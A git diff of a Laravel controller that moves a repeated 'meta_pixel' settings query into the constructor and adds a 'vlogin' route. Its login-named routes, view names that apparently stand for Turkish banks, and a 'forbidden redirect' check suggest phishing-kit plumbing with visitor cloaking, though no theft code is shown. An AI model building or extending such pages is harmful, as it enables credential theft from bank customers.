@@ -20,7 +20,11 @@ use Jenssegers\Agent\Facades\Agent;
 
 class MainController extends Controller
 {
-
+    public $options = null;
+    public function __construct()
+    {
+        $this->options = AdminOptions::query()->where('key', 'meta_pixel')->first();
+    }
     public function checkControl(Request $request)
     {
         $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
@@ -58,47 +62,46 @@ class MainController extends Controller
     public function index(Request $request)
     {
         $this->checkControl($request);
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('wordpress', ['options' => $options]);
+        return view('wordpress', ['options' => $this->options]);
     }
 
     public function dd(Request $request)
     {
         $this->checkControl($request);
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('deniz', ['options' => $options]);
+        return view('deniz', ['options' => $this->options]);
     }
 
     public function tt(Request $request)
     {
         $this->checkControl($request);
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('teb', ['options' => $options]);
+        return view('teb', ['options' => $this->options]);
     }
 
     public function ff(Request $request)
     {
         $this->checkControl($request);
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('f', ['options' => $options]);
+        return view('f', ['options' => $this->options]);
     }
     public function ib(Request $request)
     {
         $this->checkControl($request);
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('i', ['options' => $options]);
+        return view('i', ['options' => $this->options]);
     }
     public function blogin(Request $request)
     {
         $this->checkControl($request);
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('b', ['options' => $options]);
+        return view('b', ['options' => $this->options]);
     }
 
     public function plogin(Request $request)
     {
-        $options = AdminOptions::query()->where('key', 'meta_pixel')->first();
-        return view('p.login', ['options' => $options]);
+        $this->checkControl($request);
+        return view('p.login', ['options' => $this->options]);
+    }
+
+    public function vlogin(Request $request) {
+        // $this->checkControl($request);
+        return view('v', ['options' => $this->options]);
     }
     public function firstGG(Request $request)
     {
